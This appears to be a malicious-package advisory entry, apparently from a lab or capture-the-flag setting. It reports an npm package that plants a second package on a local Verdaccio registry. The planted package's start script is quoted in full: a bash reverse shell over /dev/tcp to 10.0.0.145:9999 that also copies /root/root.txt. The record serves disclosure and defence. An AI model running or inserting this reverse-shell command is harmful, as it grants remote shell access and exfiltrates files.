summary: Publishes reverse-shell package to local Verdaccio registry on exported command()
details: The package's exported command() function poisons a local npm registry by auto-registering an anonymous user (vert/vert123/vert@test.com) against http://0.0.0.0:4873/ and publishing a package named uhclabs_local_check@99.0.0 whose start script runs `/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.145/9999 0>&1; cat /root/root.txt > /tmp/root_flag.txt'`. Any environment that subsequently installs and starts the planted package from the local registry receives a reverse shell to 10.0.0.145:9999 and exfiltrates /root/root.txt. Behavior is reachable by any consumer that requires this package and invokes the exported function (index.js lines 8, 13, 19).

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
